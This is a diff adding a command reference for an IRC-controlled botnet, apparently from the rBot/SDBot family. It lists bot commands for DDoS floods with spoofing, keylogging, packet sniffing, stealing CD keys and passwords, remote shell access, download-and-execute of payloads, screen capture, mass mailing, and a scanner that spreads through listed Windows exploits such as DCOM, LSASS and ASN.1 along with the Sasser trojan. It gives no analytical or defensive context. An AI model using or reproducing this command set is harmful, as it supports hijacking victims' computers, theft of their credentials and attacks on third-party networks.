@@ -1,0 +1,155 @@
+.rndnick
+.cl0se
+.logout
+.version
+.secure
+.socks4
+.socks4stop
+.rloginstop
+.httpstop
+.tftpstop
+.logstop
+.redirectstop
+.ddos.stop
+.synstop
+.udpstop
+.tftpstop
+.findfilestop
+.procsstop
+.clonestop
+.securestop
+.scanstop
+.scanstats
+.massmail (-f = freeze email searching)
+.massmailstop
+.reconnect
+.disconnect
+.quit <message>
+.status
+.id <bot id to display>
+.reboot
+.threads
+.aliases
+.log
+.clearlog
+.netinfo
+.sysinfo
+.un1nstall <removal password>
+.proc
+.getcdkeys
+.uptime
+.driveinfo
+.testdlls
+.encrypt
+.opencmd
+.cmdstop
+.who
+.getclip
+.flusharp
+.flushdns
+.currentip <thread>
+.rloginserver <port> <username> <hostname>
+.httpserver <port> <directory> -d(disable)
+.tftpserver <filename> <requestname>
+.cr4sh
+.findpass
+.speedtest/.test
+.h4sh1n <password> <bot id to login to>
+.nick <newnickname>
+.j0in <channel> <key>
+.p4rt <channel>
+.raw <quote>
+.killthread <thread#>...
+.c_quit <clonethread>
+.c_rndnick <clonethread> <const/letter/comp/country/os/real>
+.prefix <newprefix>
+.open <file> (shows file being open)
+.server <s3rver>
+.dns <ip/hostname>
+.killproc <process>
+.kill <processid>
+.delete <file>
+.get <filetosend>
+.list <directory>
+.visit <url> <referrer>
+.mirccmd <command>
+.cmd <command to send to shell>
+.readfile <file>
+.psniff <on/off> <channel/user to output>
+.ident <on/off>
+.keylog <on/file/off>
+.net <start <service>/stop/pause/continue/delete/share -d(delete) <share>/user -d(delete) <user>/send <message>>
+.capture <screen <file.bmp>/drivers/frame <file.bmp> <driver> <x> <y>/video <file.avi> <driver> <time> <x> <y>> 
+.gethost <ip>
+.system <logoff/reboot/shutdown>
+.addalias <alias>
+.privmsg <channel> <text>
+.action <channel/user> <action>
+.cycle <delay> <channel>
+.mode <channel> <modes>
+.c_raw <clone#> <quote>
+.c_mode <clone#> <mode>
+.c_nick <clone#> <nick>
+.c_join <clone#> <channel>
+.c_part <clone#> <channel>
+.repeat <times> <text>
+.delay <delay> <text>
+.upg4de <url> <file> <rmpassword>
+.execute <1=showwindow> <file>
+.findfile <drive> <file>
+.rename/.mv <src> <dest>
+.1cmpflood <address> <secs>
+.clone <server> <port> <channel> <chanpass>
+.ddos.syn <address> <port> <secs>
+.5ynflood <address> <port> <length>
+.r3trieve <url> <dest> <1=run> <opt:crc> <opt:filelen> opt:-e(encrypted)
+.redirect <localport> <dest> <destport>
+.scan <address> <port> <delay>
+.c_privmsg <clone#> <channel> <msg>
+.c_action <clone#> <channel/user> <action> 
+.udpfl00d <host> <times> <size> <delay>
+.p1ngflood <host> <times> <size> <delay>
+.7cpflood <syn/ack/random> <ip> <port> -r(spoof)
+.email <smtpserver> <port> <sendemail> <recpemail> <subject> 
+.httpcon <host> <port> <method> <url> <referrer>
+.ftpget <host> <username> <password> <remotefile> <localfile>
+.ftpput <host> <username> <password> <localfile> <remotefile>
+.4dvsc4n/.4sc <exploit> <threads> <delay> <minutes> <address> <options>
+
+* Exploits available:
+ntpass - N/A
+dcom135 - http://www.microsoft.com/technet/ security/bulletin/MS03-026.aspx
+dcom445 - http://www.microsoft.com/technet/ security/bulletin/MS03-026.aspx
+dcom2 - http://www.microsoft.com/technet/ security/bulletin/MS03-026.aspx
+asn1http - http://www.microsoft.com/technet/ security/bulletin/MS04-007.aspx
+asn1smb - http://www.microsoft.com/technet/ security/bulletin/MS04-007.aspx
+asn1smbnt - http://www.microsoft.com/technet/ security/bulletin/MS04-007.aspx
+wkssvcXP - http://www.microsoft.com/technet/ security/bulletin/MS03-049.aspx - Win2K SP4 with FAT32 file system
+wkssvcENG - http://www.microsoft.com/technet/ security/bulletin/MS03-049.aspx - Windows XP SP0+1 ENG
+wkssvcOth - http://www.microsoft.com/technet/ security/bulletin/MS03-049.aspx - Windows XP SP0+1 GER+NL+IT+FR
+mssqlexec - http://msdn.microsoft.com/library/default.asp?url=/library/en-us/tsqlref/ts_xp_aa-sz_4jxo.asp
+mssqlauth - http://www.securityfocus.com/bid/5411
+mssqlres - http://www.microsoft.com/technet/ security/bulletin/MS02-039.aspx
+veritas - http://www.securityfocus.com/bid/11974
+msmq - http://www.microsoft.com/technet/ security/bulletin/MS05-017.aspx
+lsass - http://www.microsoft.com/technet/ security/bulletin/MS04-011.aspx
+
+dcass - dcom135 + dcom445 + lsass
+dcsasswks - dcom135 + dcom445 + lsass + sasser+sassere
+massasn - asn1http + asn1smb + asn1smbnt
+hellz - massasn + wkssvc
+mssql - mssqlexec + mssqlauth + mssqlres
+ftpds - ServU + GlobalScape + NetTerm NetFTPd + WS_FTP
+
+* Trojans/Viruses
+sasser - http://packetstormsecurity.org/0405-exploits/sasserftpd.c
+sassere - http://packetstormsecurity.org/0405-exploits/sasserftpd.c
+
+* Addresses
+x = random ip between 0-255
+-r = lets say ip is 127.1.0.1, it will scan 127.1.x.x (randomly)
+-a = scans first octet of ip (randomly with -r) Ex: 127.1.0.0 or if -r is present 127.x.x.x
+-b = scans second octet of ip (randomly with -r) Ex: 127.1.0.0 or if -r is present 127.1.x.x
+
+* Options
+-e = If computer is behind a router, it retrieves the external ip address and scans that (may cause external computers to be unresponsive due to the firewall)
